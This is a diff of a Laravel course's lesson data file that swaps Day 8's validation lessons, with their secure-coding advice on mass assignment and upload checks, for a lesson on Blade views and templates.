@@ -2,1436 +2,1603 @@ import type { LessonDay } from "@/lib/learn/lesson-types";
 
 export const LARAVEL_DAY_8_LESSONS: LessonDay = {
   day: 8,
-  title: "Validation — rules, Form Requests, custom rules & error display",
-  totalMinutes: 67,
+  title: "Views & Blade — layouts, components, slots & stacks",
+  totalMinutes: 79,
   difficulty: "Beginner",
   lessons: [
     {
-      id: "why-validate",
-      title: "Why validate, and what validate() does",
-      durationMinutes: 9,
-      explanation: "The forms you built on Day 6 accepted anything. Today they stop doing that.\n\n<b>Validation</b> is checking incoming data against rules you set, and rejecting the request before that data reaches the rest of your application. <b>Server-side validation</b> is the check that runs on your own server, and it is the only one that counts, because browser rules can be bypassed with a terminal.\n\nOne sentence carries the whole topic:\n\n```text\nNever trust data coming from the browser.\n```\n\nYour HTML might say:\n\n```html\n<input type=\"email\" name=\"email\" required maxlength=\"100\">\n```\n\nand someone can still send:\n\n```bash\ncurl -X POST https://invoicehub.test/invoices -d \"email=nonsense\"\n```\n\nBrowser-side rules are a convenience for honest users. They are not a control. Anyone can bypass them with a terminal, and someone eventually will.\n\n---\n\n### 1. Basic — the one-liner\n\n```php\npublic function store(Request $request)\n{\n    $validated = $request->validate([\n        'number' => 'required',\n        'client' => 'required',\n        'amount' => 'required|numeric',\n    ]);\n\n    // Only reached when everything passed.\n    Invoice::create($validated);\n}\n```\n\nThe `|` separates rules for one field:\n\n```text\namount\n ├── required\n └── numeric\n```\n\nAn array is the same thing and reads better once rules get long:\n\n```php\n'amount' => ['required', 'numeric', 'min:0'],\n```\n\nPrefer the array form. It avoids escaping problems when a rule contains a pipe or a comma, which happens with regular expressions.\n\n---\n\n### 2. Intermediate — what happens on failure\n\nThis is the part people find surprising, so it is worth being explicit.\n\n`validate()` does not return `false`. It <b>throws</b> a `ValidationException`, and Laravel catches it for you:\n\n```text\n$request->validate([...])\n          │\n    ┌─────┴─────┐\n  passes       fails\n    │            │\nreturns the   throws ValidationException\nvalidated       │\ndata       ┌────┴────┐\n        browser     API\n           │          │\n     redirect back   422 JSON\n     + errors        with errors\n     + old input\n```\n\nSo you never write this:\n\n```php\n// Not needed. Ever.\nif (! $validated) {\n    return back();\n}\n```\n\nLaravel decides the response format by looking at the request. A browser gets a redirect back with errors and old input already flashed. A client sending `Accept: application/json` gets a <b>422</b> response with an `errors` object.\n\nThat 422 is worth remembering: it means \"I understood your request, but the data is not acceptable\". Not 400, and not 500.\n\n---\n\n### 3. Advanced — why the return value matters\n\n`validate()` returns <b>only the fields you wrote rules for</b>. That is a security feature, not a convenience.\n\n```text\nClient sends              Rules cover           $validated contains\n───────────               ───────────           ──────────────────\nnumber  ✓                 number                number\nclient  ✓                 client                client\namount  ✓                 amount                amount\nis_paid ✗ (not a rule)                          (dropped)\n```\n\nCompare the two ways to save:\n\n```php\nInvoice::create($request->all());        // everything the client sent\nInvoice::create($validated);             // only what you asked for\n```\n\nThe first is <b>mass assignment</b> (letting client input decide which columns get written). If your table has an `is_paid` column and someone adds `is_paid=1` to the form data, the first line marks the invoice paid. Nothing errors, because from the database's point of view nothing is wrong.\n\nEloquent's `$fillable` is a second line of defence here, and you will meet it tomorrow. But validation is the first: if a field has no rule, it never reaches your model.\n\nSo the habit is simple, and it is the single most important one in this lesson:\n\n```text\nAlways save $validated. Never save $request->all().\n```",
-      diagram: `Client-side rules are a convenience, not a control
+      id: "views-and-blade",
+      title: "Views, and how Blade works",
+      durationMinutes: 10,
+      explanation: "Yesterday's controllers returned `view(...)` without much explanation. Today the view is the subject.\n\nA <b>view</b> (the file responsible for turning data into HTML) is where presentation lives. The split is simple:\n\n```text\nController  →  \"here is the data\"\nView        →  \"here is how it should look\"\n```\n\n<b>Blade</b> is Laravel's template engine: HTML with a small amount of extra syntax for variables, conditions and loops.\n\n---\n\n### 1. Basic — creating and returning one\n\nViews live in `resources/views/` and end in `.blade.php`:\n\n```bash\nphp artisan make:view invoices.index\n```\n\n```text\nresources/views/invoices/index.blade.php\n```\n\nThe name uses dots where the path uses slashes:\n\n```text\nresources/views/invoices/index.blade.php\n                 └──────┴─────┘\n                  invoices.index\n```\n\nReturn it from a controller, passing data as the second argument:\n\n```php\npublic function index()\n{\n    return view('invoices.index', [\n        'invoices' => $invoices,\n        'company'  => config('invoicing.company_name'),\n    ]);\n}\n```\n\nEach key becomes a variable in the template:\n\n```blade\n<h1>{{ $company }}</h1>\n\n<p>{{ count($invoices) }} invoices</p>\n```\n\nThree other ways to pass data exist, and you will see all of them:\n\n```php\nreturn view('invoices.index')->with('invoices', $invoices);\nreturn view('invoices.index', compact('invoices'));\nreturn view('invoices.index', ['invoices' => $invoices]);   // clearest\n```\n\nThe array form is worth preferring. `compact('invoices')` reads a variable by name, so renaming the local variable silently changes what the template receives.\n\n---\n\n### 2. Intermediate — Blade is compiled, not interpreted\n\nThis is the part that explains most of Blade's behaviour.\n\nBlade does not run as its own language. Laravel <b>compiles</b> each template into plain PHP, caches that file, and executes the cached PHP on later requests:\n\n```text\ninvoices/index.blade.php\n        ↓ compile (first request, or after an edit)\nstorage/framework/views/a3f9c2....php\n        ↓ execute\n      HTML\n```\n\nSo `{{ $name }}` becomes roughly `<?php echo e($name); ?>`, and `@if` becomes `<?php if (...): ?>`.\n\nTwo useful consequences:\n\nBlade costs almost nothing at runtime. After the first request it is ordinary PHP, so directives are not something to ration.\n\nAnd you can look at the compiled output when a template misbehaves. The files in `storage/framework/views/` are readable PHP, which turns \"why is this rendering oddly\" into a question you can answer directly.\n\nLaravel recompiles automatically when the source file changes. When it seems not to:\n\n```bash\nphp artisan view:clear\n```\n\n---\n\n### 3. Advanced — what belongs in a template\n\nThe temptation is to reach for the database from a view, because it is convenient:\n\n```blade\n{{-- Don't --}}\n@foreach (App\\Models\\Invoice::where('status', 'paid')->get() as $invoice)\n```\n\nTwo things go wrong. The query now runs during rendering, so it cannot be tested without rendering HTML, and it cannot be cached, reused or replaced. And inside a loop this is how you get dozens of unnoticed queries on one page.\n\nThe controller should hand over finished data:\n\n```php\nreturn view('invoices.index', ['invoices' => $this->invoices->paid()]);\n```\n\nA workable line: a template may <b>read</b> data and decide how to display it. It should not <b>fetch</b> data or decide what the data means.\n\n```text\nFine in a template            Belongs in the controller\n──────────────────            ─────────────────────────\nloop over what you were given  running the query\nformat a date for display      deciding which records to show\nshow a badge if status is paid  calculating the totals\nchoose a CSS class             deciding whether the user may see it\n```\n\nThe practical test is the same one from Day 7: if the answer would be the same for an API response with no HTML at all, it is not presentation.",
+      diagram: `Controller decides, view displays
 
-  <input type="email" required maxlength="100">
-                    ↓
-  curl -X POST ... -d "email=nonsense"    ← bypasses all of it
-                    ↓
-            SERVER-side validation        ← the only real gate
+  Controller                          View
+  ──────────                          ────
+  fetch the invoices        →         loop over them
+  calculate the totals      →         format them for display
+  decide who may see them   →         choose a CSS class
 
-
-validate() throws; it does not return false
-
-  $request->validate([...])
-            │
-      ┌─────┴─────┐
-    passes       fails
-      │            │
-  returns the   ValidationException
-  validated       │
-  data       ┌────┴────┐
-          browser     API client
-             │            │
-       redirect back   422 + errors JSON
-       + errors
-       + old input
-
-  So you never write: if (! $validated) { ... }
+  return view('invoices.index', ['invoices' => $invoices]);
+                    │                    │
+              file to render        becomes $invoices
 
 
-validate() returns ONLY the fields you wrote rules for
+Naming: slashes become dots
 
-  sent          rules        $validated
-  ────          ─────        ──────────
-  number   ✓    number       number
-  client   ✓    client       client
-  amount   ✓    amount       amount
-  is_paid  ✗    (none)       DROPPED
+  resources/views/invoices/index.blade.php
+                   └──────┴─────┘
+                    invoices.index
 
-  Invoice::create($request->all())  → is_paid=1 gets written
-  Invoice::create($validated)       → it never arrives`,
+
+Blade is COMPILED, not interpreted
+
+  invoices/index.blade.php
+          ↓  compile (first request, or after an edit)
+  storage/framework/views/a3f9c2....php     ← readable PHP
+          ↓  execute
+        HTML
+
+  {{ $name }}  →  <?php echo e($name); ?>
+  @if (...)    →  <?php if (...): ?>
+
+  So directives cost nothing at runtime, and you can
+  open the compiled file when a template misbehaves.
+  Stuck on an old version? php artisan view:clear`,
       codeExample: {
-        title: "Validating, and the mass-assignment trap",
+        title: "Rendering a view, and what not to put in it",
         code: `<?php
-
-namespace App\\Http\\Controllers;
-
-use App\\Models\\Invoice;
-use Illuminate\\Http\\Request;
-
-class InvoiceController extends Controller
-{
-    public function store(Request $request)
-    {
-        // Pipe syntax: fine for short rule lists.
-        $validated = $request->validate([
-            'number' => 'required',
-            'amount' => 'required|numeric',
-        ]);
-
-        // Array syntax: prefer this. No escaping problems when a rule
-        // contains a pipe or comma, as regular expressions do.
-        $validated = $request->validate([
-            'number' => ['required', 'string', 'max:20'],
-            'client' => ['required', 'string', 'max:100'],
-            'amount' => ['required', 'numeric', 'min:0'],
-            'notes'  => ['nullable', 'string', 'max:1000'],
-        ]);
-
-        // Only reached when everything passed. On failure Laravel has
-        // already redirected back (browser) or returned 422 (API).
-        Invoice::create($validated);
-
-        return redirect()
-            ->route('invoices.index')
-            ->with('success', 'Invoice created.');
-    }
-}
-
-
-// ---------- The mass-assignment trap ----------
-
-// DANGEROUS: everything the client sent reaches the model.
-// A form field named is_paid=1 marks the invoice paid, silently.
-Invoice::create($request->all());
-
-// SAFE: only the fields you wrote rules for.
-Invoice::create($validated);
-
-
-// ---------- What Laravel returns on failure ----------
-
-// Browser request:
-//   302 redirect back, with $errors and old input flashed
-//
-// Request with Accept: application/json
-//   HTTP/1.1 422 Unprocessable Content
-//   {
-//     "message": "The number field is required.",
-//     "errors": {
-//       "number": ["The number field is required."],
-//       "amount": ["The amount field must be a number."]
-//     }
-//   }
-//
-// 422 means "understood, but the data is not acceptable".
-// Not 400, and not 500.`,
-      },
-      keyTakeaways: [
-        "<b>Never trust the browser.</b> HTML attributes like `required` are a convenience and are trivially bypassed.",
-        "<b>`$request->validate([...])`</b> is the quickest way to validate, straight in the controller.",
-        "Prefer the <b>array form</b> of rules; it avoids escaping trouble when a rule contains a pipe or comma.",
-        "`validate()` <b>throws</b> on failure rather than returning false, so you never check its result.",
-        "A browser gets a redirect back with errors and old input; an API client gets a <b>422</b> with an errors object.",
-        "<b>422 means the data is unacceptable</b>, not 400 and not 500.",
-        "`validate()` returns <b>only the fields you wrote rules for</b>, which is what makes it safe to save.",
-        "<b>Always save `$validated`, never `$request->all()`</b>, or client input decides which columns get written.",
-      ],
-      commonMistakes: [
-        "<b>Relying on HTML `required` or `maxlength`.</b> A terminal bypasses both in one command.",
-        "<b>Checking the return value of `validate()`.</b> It throws on failure, so an `if` around it never runs.",
-        "<b>Saving `$request->all()`.</b> This is mass assignment: an unexpected field in the form data gets written to your table.",
-        "<b>Returning 400 or 500 for invalid input.</b> 422 is the code clients expect and can act on.",
-        "<b>Validating only on the front end because the form already checks.</b> The form is not what sends the request.",
-      ],
-      quiz: [
-        {
-          question: "What happens when `$request->validate()` fails?",
-          options: [
-            "It returns false",
-            "It throws a ValidationException that Laravel converts to a response",
-            "It returns an empty array",
-            "It logs a warning",
-          ],
-          correctIndex: 1,
-          explanation: "Which is why you never write an `if` around it.",
-        },
-        {
-          question: "What status code does a failed validation return to an API client?",
-          options: [
-            "422",
-            "400",
-            "500",
-            "403",
-          ],
-          correctIndex: 0,
-          explanation: "422 means the request was understood but the data is not acceptable.",
-        },
-        {
-          question: "Why is saving `$request->all()` dangerous?",
-          options: [
-            "It is slow",
-            "It can be null",
-            "Any field the client sends reaches your model, including ones you never intended",
-            "It skips validation",
-          ],
-          correctIndex: 2,
-          explanation: "A form field named `is_paid=1` would be written straight to the column.",
-        },
-        {
-          question: "What does `validate()` return on success?",
-          options: [
-            "Everything the client sent",
-            "Only the fields you wrote rules for",
-            "A boolean",
-            "The Request object",
-          ],
-          correctIndex: 1,
-          explanation: "Which is exactly what makes it safe to pass to `create()`.",
-        },
-      ],
-    },
-    {
-      id: "common-rules",
-      title: "The rules you will use constantly",
-      durationMinutes: 12,
-      explanation: "There are over ninety built-in rules. You need about fifteen.\n\nA <b>rule</b> is one named condition a field has to satisfy. You list them per field, and Laravel ships around ninety, so most of the work is picking the right few rather than writing the checks yourself.\n\n---\n\n### 1. Basic — presence and shape\n\n```php\n'number' => ['required'],           // present and not empty\n'notes'  => ['nullable'],           // may be null, but validate if given\n'email'  => ['required', 'email'],\n'amount' => ['required', 'numeric'],\n'count'  => ['required', 'integer'],\n'active' => ['required', 'boolean'],\n'due_at' => ['required', 'date'],\n'status' => ['required', 'in:draft,sent,paid'],\n```\n\n<b>`nullable` is the one people miss.</b> Without it, an optional field that arrives empty fails every other rule you attached:\n\n```php\n'notes' => ['string', 'max:500']            // empty note → fails \"string\"\n'notes' => ['nullable', 'string', 'max:500'] // empty note → skipped\n```\n\nRemember from Day 6 that Laravel converts empty form fields to `null`. So an untouched optional input arrives as `null`, and without `nullable` your rules reject it.\n\nLength rules change meaning by type, which trips people up:\n\n```text\n'max:100' on a string   →  100 characters\n'max:100' on a number   →  the value 100\n'max:100' on an array   →  100 items\n'max:100' on a file     →  100 kilobytes\n```\n\nSo `'amount' => 'numeric|max:100'` caps the amount at one hundred, not at a hundred digits.\n\n---\n\n### 2. Intermediate — the database rules\n\nTwo rules query your database.\n\n<b>`unique`</b> makes sure a value is not already taken:\n\n```php\n'number' => ['required', 'unique:invoices,number'],\n```\n\n<b>`exists`</b> makes sure it is already there:\n\n```php\n'client_id' => ['required', 'exists:clients,id'],\n```\n\n`exists` is doing more work than it looks. Without it, someone can post `client_id=999` and either get a foreign-key error at the database level, or worse, attach the invoice to a client belonging to someone else. It turns \"this id is real\" from an assumption into a check.\n\n<b>`confirmed`</b> is the password pattern:\n\n```php\n'password' => ['required', 'confirmed', 'min:8'],\n```\n\nIt looks for a second field named `password_confirmation` and requires the two to match. The naming is a convention: `field` pairs with `field_confirmation`.\n\n---\n\n### 3. Advanced — files, and where beginners get burned\n\nFile rules look simple and hide a real security decision.\n\n```php\n'attachment' => ['required', 'file', 'mimes:pdf,doc,docx', 'max:10240'],\n'logo'       => ['required', 'image', 'mimes:jpg,png', 'max:2048'],\n```\n\n```text\nfile    an upload arrived\nimage   it is jpg, png, bmp, gif, svg or webp\nmimes   restrict to these extensions\nmax     SIZE IN KILOBYTES, so 2048 is 2 MB\n```\n\nThat `max` unit catches everyone once. `max:2` is two kilobytes, not two megabytes.\n\nNow the part that matters. <b>`mimes` checks the file's actual content</b>, not just the name. Laravel reads the file and compares its real type against the extensions you listed. So renaming `virus.php` to `invoice.pdf` does not get past it.\n\nBut `image` includes <b>SVG</b>, and an SVG can contain JavaScript. Accepting one and serving it from your own domain gives an attacker a script running on your site. If you only need photographs, say so:\n\n```php\n'logo' => ['required', 'image', 'mimes:jpg,jpeg,png,webp', 'max:2048'],\n```\n\nTwo more worth knowing:\n\n```php\n'logo'     => ['dimensions:min_width=100,min_height=100'],\n'document' => ['mimetypes:application/pdf'],   // by MIME type, not extension\n```\n\nAnd always set a `max`. Without one your upload limit is whatever `php.ini` allows, which is rarely what you intended and is an easy way to fill a disk.",
-      diagram: `max changes meaning by type
-
-  'max:100' on a string  →  100 characters
-  'max:100' on a number  →  the VALUE 100
-  'max:100' on an array  →  100 items
-  'max:100' on a file    →  100 KILOBYTES
-
-  So max:2048 on an upload is 2 MB, and max:2 is 2 KB.
-
-
-nullable: the rule people forget
-
-  'notes' => ['string', 'max:500']
-      empty field arrives as null → fails "string"  ✗
-
-  'notes' => ['nullable', 'string', 'max:500']
-      empty field arrives as null → skipped         ✓
-
-  Laravel turns empty form fields into null,
-  so every optional field needs nullable.
-
-
-unique vs exists
-
-  unique:invoices,number   must NOT already be there   (new invoice number)
-  exists:clients,id        must ALREADY be there       (real client id)
-
-  Without exists, client_id=999 either errors at the
-  database or attaches to someone else's record.
-
-
-mimes checks CONTENT, not the filename
-
-  virus.php renamed to invoice.pdf   →  still rejected ✓
-
-  But 'image' allows SVG, and an SVG can carry JavaScript.
-  Serving one from your domain runs that script on your site.
-
-  'image', 'mimes:jpg,jpeg,png,webp'   ← say what you mean`,
-      codeExample: {
-        title: "A realistic rule set",
-        code: `<?php
-
-$validated = $request->validate([
-
-    // ---------- Presence ----------
-    'number'  => ['required', 'string', 'max:20'],
-    'notes'   => ['nullable', 'string', 'max:1000'],   // nullable, or an
-                                                       // empty field fails
-    // ---------- Types ----------
-    'amount'  => ['required', 'numeric', 'min:0'],
-    'count'   => ['required', 'integer', 'between:1,999'],
-    'is_paid' => ['required', 'boolean'],
-    'due_at'  => ['required', 'date', 'after:today'],
-    'email'   => ['required', 'email', 'max:255'],
-    'website' => ['nullable', 'url'],
-
-    // ---------- A fixed set of values ----------
-    'status'  => ['required', 'in:draft,sent,paid'],
-
-    // ---------- Database checks ----------
-    // Must NOT already exist:
-    'number'    => ['required', 'unique:invoices,number'],
-    // Must ALREADY exist. Without this, client_id=999 either errors at
-    // the database or attaches to another account's client.
-    'client_id' => ['required', 'exists:clients,id'],
-
-    // ---------- Passwords ----------
-    // Looks for a second field named password_confirmation.
-    'password' => ['required', 'confirmed', 'min:8'],
-
-    // ---------- Files ----------
-    // max is in KILOBYTES: 10240 = 10 MB, 2048 = 2 MB.
-    // mimes reads the file's real content, so renaming does not help.
-    'attachment' => ['nullable', 'file', 'mimes:pdf,doc,docx', 'max:10240'],
-
-    // 'image' allows SVG, and an SVG can contain JavaScript. Naming the
-    // formats you actually want avoids serving a script from your domain.
-    'logo' => [
-        'nullable',
-        'image',
-        'mimes:jpg,jpeg,png,webp',
-        'max:2048',
-        'dimensions:min_width=100,min_height=100',
-    ],
-
-    // By MIME type rather than extension:
-    'contract' => ['nullable', 'mimetypes:application/pdf', 'max:10240'],
-]);
-
-
-// ---------- Other rules worth knowing ----------
-// 'starts_with:INV-'      'ends_with:.pdf'
-// 'regex:/^INV-[0-9]{3}$/'   (array syntax only, no pipes)
-// 'different:other_field'  'same:other_field'
-// 'after:2024-01-01'       'before_or_equal:due_at'
-// 'digits:10'              'digits_between:8,12'
-// 'lowercase'  'uppercase'  'alpha'  'alpha_num'  'alpha_dash'`,
-      },
-      keyTakeaways: [
-        "<b>`nullable`</b> is required on every optional field, because Laravel turns empty inputs into `null`.",
-        "<b>`max` changes meaning by type</b>: characters for strings, value for numbers, items for arrays, <b>kilobytes for files</b>.",
-        "`in:draft,sent,paid` restricts a field to a known set of values.",
-        "<b>`unique`</b> means not already present; <b>`exists`</b> means already present, and it stops forged ids.",
-        "<b>`confirmed`</b> looks for `field_confirmation` and requires the two to match.",
-        "<b>`mimes` inspects the file's real content</b>, so renaming an executable does not fool it.",
-        "<b>`image` accepts SVG</b>, which can contain JavaScript. List the formats you actually want.",
-        "Always set a `max` on uploads, or the limit is whatever `php.ini` happens to allow.",
-      ],
-      commonMistakes: [
-        "<b>Omitting `nullable` on an optional field.</b> The empty input arrives as `null` and fails `string`, `numeric` or whatever else you attached.",
-        "<b>Reading `max:2048` on a file as 2048 bytes or megabytes.</b> It is kilobytes, so 2 MB.",
-        "<b>Using `max` on a number and expecting a length check.</b> `numeric|max:100` caps the value at one hundred.",
-        "<b>Accepting `image` without naming formats.</b> SVG is allowed, and an SVG served from your domain can run JavaScript on your site.",
-        "<b>Skipping `exists` on a foreign key.</b> A forged id either crashes at the database or attaches to another account's record.",
-        "<b>Leaving uploads with no `max`.</b> Your real limit becomes a PHP setting nobody chose deliberately.",
-      ],
-      quiz: [
-        {
-          question: "Why does an optional text field need `nullable`?",
-          options: [
-            "For performance",
-            "Laravel turns empty inputs into null, which fails rules like `string`",
-            "It is required syntax",
-            "To allow an empty string",
-          ],
-          correctIndex: 1,
-          explanation: "Without it, leaving an optional field blank produces a validation error.",
-        },
-        {
-          question: "What does `max:2048` mean on a file upload?",
-          options: [
-            "2048 bytes",
-            "2048 megabytes",
-            "2048 kilobytes, so about 2 MB",
-            "2048 characters",
-          ],
-          correctIndex: 2,
-          explanation: "The unit for files is kilobytes, which catches most people once.",
-        },
-        {
-          question: "What is the difference between `unique` and `exists`?",
-          options: [
-            "They are the same",
-            "`unique` only works on strings",
-            "`exists` is for files",
-            "`unique` must not already exist; `exists` must already exist",
-          ],
-          correctIndex: 3,
-          explanation: "`exists` is what stops a forged foreign key reaching your database.",
-        },
-        {
-          question: "Why is `'image'` alone risky for uploads?",
-          options: [
-            "It accepts SVG, which can contain JavaScript",
-            "It only allows JPEG",
-            "It is slow",
-            "It ignores file size",
-          ],
-          correctIndex: 0,
-          explanation: "Serving that SVG from your own domain runs the script on your site.",
-        },
-      ],
-    },
-    {
-      id: "form-requests",
-      title: "Form Requests, and the Validator facade",
-      durationMinutes: 12,
-      explanation: "Controller validation is fine until the rule list is longer than the method around it. Then it moves out.\n\nA <b>Form Request</b> is a dedicated class holding one action's rules and its permission check. You type-hint it in place of `Request`, and both run before your controller method is entered.\n\n---\n\n### 1. Basic — a dedicated class\n\n```bash\nphp artisan make:request StoreInvoiceRequest\n```\n\n```php\nnamespace App\\Http\\Requests;\n\nuse Illuminate\\Foundation\\Http\\FormRequest;\n\nclass StoreInvoiceRequest extends FormRequest\n{\n    public function authorize(): bool\n    {\n        return true;\n    }\n\n    public function rules(): array\n    {\n        return [\n            'number' => ['required', 'string', 'max:20'],\n            'client' => ['required', 'string', 'max:100'],\n            'amount' => ['required', 'numeric', 'min:0'],\n        ];\n    }\n}\n```\n\nType-hint it instead of `Request`, and everything happens before your method runs:\n\n```php\npublic function store(StoreInvoiceRequest $request)\n{\n    Invoice::create($request->validated());\n\n    return redirect()->route('invoices.index');\n}\n```\n\nThree lines, and the controller says only what it does.\n\nThe mechanism is worth naming: this is the method injection from Day 6. Laravel resolves the argument, and a `FormRequest` runs `authorize()` and `rules()` during resolution. Failure throws before your code is entered, exactly as `validate()` did.\n\nNaming convention: `StoreInvoiceRequest` and `UpdateInvoiceRequest`, matching the resource actions. `php artisan make:controller InvoiceController --resource --requests` generates both.\n\n---\n\n### 2. Intermediate — the two methods do different jobs\n\n```text\nauthorize()   MAY this person do this?\nrules()       IS the submitted data acceptable?\n```\n\nThey are genuinely separate questions, and mixing them up produces confusing behaviour.\n\n```php\npublic function authorize(): bool\n{\n    return $this->user()?->can('create', Invoice::class) ?? false;\n}\n```\n\nReturning `false` gives a <b>403</b>, not a validation error. That is correct: a permission problem is not something the user can fix by editing a field.\n\nTwo things about `authorize()` catch people out.\n\nReturning `true` is not laziness by default; it means \"anyone who reached this route may submit it\", which is often right because route middleware already handled access. But leaving `true` on a request that genuinely needs a check is a silent hole, since nothing complains.\n\nAnd inside a form request, `$this` <i>is</i> the request. So `$this->user()`, `$this->route('invoice')` and `$this->input('client')` all work, which is how you write a check that depends on the record being edited.\n\n---\n\n### 3. Advanced — getting the data out, and the Validator facade\n\n```php\n$request->validated();                      // everything that passed\n$request->safe()->only(['number']);         // a subset\n$request->safe()->except(['notes']);\n$request->validated('number');              // one field\n```\n\n`validated()` is the one to reach for. Note that it returns validated fields only, which is why `Invoice::create($request->validated())` is safe in a way `$request->all()` never is.\n\nYou can also prepare input <b>before</b> the rules run:\n\n```php\nprotected function prepareForValidation(): void\n{\n    $this->merge([\n        'number' => strtoupper(trim($this->input('number', ''))),\n    ]);\n}\n```\n\nThis is the right place to normalise. Uppercase an invoice number here and your `unique` rule compares the cleaned value, rather than treating `inv-001` and `INV-001` as different.\n\nFinally, the <b>Validator facade</b>, for when neither approach fits:\n\n```php\nuse Illuminate\\Support\\Facades\\Validator;\n\n$validator = Validator::make($request->all(), [\n    'number' => ['required'],\n]);\n\nif ($validator->fails()) {\n    return back()->withErrors($validator)->withInput();\n}\n\n$validated = $validator->validated();\n```\n\nIt returns an object instead of throwing, so you decide what happens next. Use it when you need to validate something that is not the current request at all: a CSV row during an import, a payload from a queued job, data from an external API.\n\nChoosing between the three:\n\n```text\n$request->validate()   a short rule list, one place\nForm Request           a real form, reused rules, an authorize check\nValidator::make()      data that is not the current HTTP request\n```",
-      diagram: `Where validation lives, as rules grow
-
-  $request->validate([...])          Form Request
-  ────────────────────────           ────────────
-  short list                         long list
-  used once                          reused (store + update)
-  no permission check                authorize() belongs somewhere
-  visible in the method              controller stays 3 lines
-
-  Validator::make()
-  ─────────────────
-  data that is NOT the current request:
-  a CSV row, a queue payload, an API response
-  returns an object instead of throwing
-
-
-authorize() and rules() answer different questions
-
-  authorize()  MAY this person do this?   false → 403
-  rules()      IS the data acceptable?    fail  → 422 / redirect
-
-  403 is not something the user can fix by editing a field.
-  Leaving authorize() as \`true\` on a request that needs a
-  check is a silent hole: nothing complains.
-
-
-prepareForValidation runs BEFORE the rules
-
-  input: "  inv-001  "
-            ↓ prepareForValidation
-        "INV-001"
-            ↓ rules, including unique:invoices,number
-      compares the CLEANED value
-
-  Without it, inv-001 and INV-001 look like different invoices.`,
-      codeExample: {
-        title: "A Form Request end to end",
-        code: `<?php
-// php artisan make:request StoreInvoiceRequest
-
-namespace App\\Http\\Requests;
-
-use App\\Models\\Invoice;
-use Illuminate\\Foundation\\Http\\FormRequest;
-
-class StoreInvoiceRequest extends FormRequest
-{
-    // MAY this person do this? Returning false gives a 403,
-    // not a validation error.
-    public function authorize(): bool
-    {
-        return $this->user()?->can('create', Invoice::class) ?? false;
-    }
-
-    // Runs BEFORE the rules. The right place to normalise input, so
-    // \`unique\` compares the cleaned value rather than the raw one.
-    protected function prepareForValidation(): void
-    {
-        $this->merge([
-            'number' => strtoupper(trim($this->input('number', ''))),
-            'email'  => strtolower(trim($this->input('email', ''))),
-        ]);
-    }
-
-    // IS the submitted data acceptable?
-    public function rules(): array
-    {
-        return [
-            'number'    => ['required', 'string', 'max:20', 'unique:invoices,number'],
-            'client_id' => ['required', 'exists:clients,id'],
-            'amount'    => ['required', 'numeric', 'min:0'],
-            'notes'     => ['nullable', 'string', 'max:1000'],
-        ];
-    }
-}
-?>
-
-<?php
 // app/Http/Controllers/InvoiceController.php
 
 class InvoiceController extends Controller
 {
-    // Authorization and validation both happen while Laravel resolves
-    // this argument, so the method body is only ever reached on success.
-    public function store(StoreInvoiceRequest $request)
+    public function index()
     {
-        Invoice::create($request->validated());
+        // The array form is clearest: renaming the local variable
+        // cannot silently change what the template receives.
+        return view('invoices.index', [
+            'invoices' => $this->invoices->all(),
+            'company'  => config('invoicing.company_name'),
+        ]);
 
-        return redirect()
-            ->route('invoices.index')
-            ->with('success', 'Invoice created.');
+        // Also valid:
+        // return view('invoices.index')->with('invoices', $invoices);
+        // return view('invoices.index', compact('invoices'));
     }
 }
-
-
-// ---------- Getting the data out ----------
-$request->validated();                    // everything that passed
-$request->validated('number');            // one field
-$request->safe()->only(['number', 'amount']);
-$request->safe()->except(['notes']);
-
-// Inside a form request, $this IS the request:
-//   $this->user()            the authenticated user
-//   $this->route('invoice')  a route parameter
-//   $this->input('client')   submitted input
 ?>
 
-<?php
-// ---------- The Validator facade: data that is not the request ----------
+{{-- resources/views/invoices/index.blade.php --}}
 
-use Illuminate\\Support\\Facades\\Validator;
+<h1>{{ $company }}</h1>
 
-foreach ($csvRows as $index => $row) {
-    $validator = Validator::make($row, [
-        'number' => ['required', 'string'],
-        'amount' => ['required', 'numeric'],
-    ]);
+<p>{{ count($invoices) }} invoices</p>
 
-    if ($validator->fails()) {
-        // It returns an object rather than throwing, so you decide.
-        $errors[$index] = $validator->errors()->all();
-        continue;
-    }
+@foreach ($invoices as $invoice)
+    <p>{{ $invoice['number'] }}</p>
+@endforeach
 
-    Invoice::create($validator->validated());
-}`,
+
+{{-- ---------- Don't do this ---------- --}}
+{{-- The query runs during rendering: untestable without HTML,
+     impossible to cache or reuse, and inside a loop it becomes
+     dozens of queries nobody notices. --}}
+@foreach (App\\Models\\Invoice::where('status', 'paid')->get() as $invoice)
+    <p>{{ $invoice->number }}</p>
+@endforeach
+
+
+{{-- ---------- Do this instead ---------- --}}
+{{-- Controller: view('invoices.index', ['paid' => $this->invoices->paid()]) --}}
+@foreach ($paid as $invoice)
+    <p>{{ $invoice['number'] }}</p>
+@endforeach
+
+
+{{-- A Blade comment. Unlike an HTML comment, it does not
+     reach the browser, so it is safe for notes to yourself. --}}
+<!-- An HTML comment DOES reach the browser. -->`,
       },
       keyTakeaways: [
-        "`php artisan make:request StoreInvoiceRequest` creates a class holding `authorize()` and `rules()`.",
-        "Type-hint it instead of `Request` and both run <b>before your method body</b>, via Day 6's method injection.",
-        "<b>`authorize()` answers may-they; `rules()` answers is-it-valid.</b> They are different questions.",
-        "Returning `false` from `authorize()` gives a <b>403</b>, not a validation error.",
-        "Leaving `authorize()` as `true` is fine when route middleware guards access, and a silent hole when it does not.",
-        "Inside a form request, `$this` is the request: `$this->user()`, `$this->route(...)`, `$this->input(...)`.",
-        "<b>`prepareForValidation()`</b> normalises input before the rules run, so `unique` compares the cleaned value.",
-        "<b>`Validator::make()`</b> returns an object instead of throwing; use it for CSV rows, queue payloads and API data.",
+        "A <b>view</b> turns data into HTML; the controller decides what that data is.",
+        "Views live in `resources/views/` and are named with dots: `invoices.index`.",
+        "Pass data as an array second argument; <b>prefer it over `compact()`</b>, which depends on a variable name.",
+        "Blade is <b>compiled to plain PHP</b> and cached, so `{{ }}` becomes `echo e(...)` and directives cost nothing at runtime.",
+        "The compiled files in `storage/framework/views/` are readable, which makes odd rendering debuggable.",
+        "`php artisan view:clear` when a stale compiled view is being served.",
+        "A template may <b>read</b> data and decide how to show it; it should not <b>fetch</b> data.",
+        "`{{-- --}}` is a Blade comment and never reaches the browser, unlike an HTML comment.",
       ],
       commonMistakes: [
-        "<b>Leaving `authorize()` returning `true` on a request that needs a check.</b> Nothing warns you, and the endpoint is open.",
-        "<b>Putting permission logic in `rules()`.</b> A permission failure becomes a field error the user cannot possibly fix.",
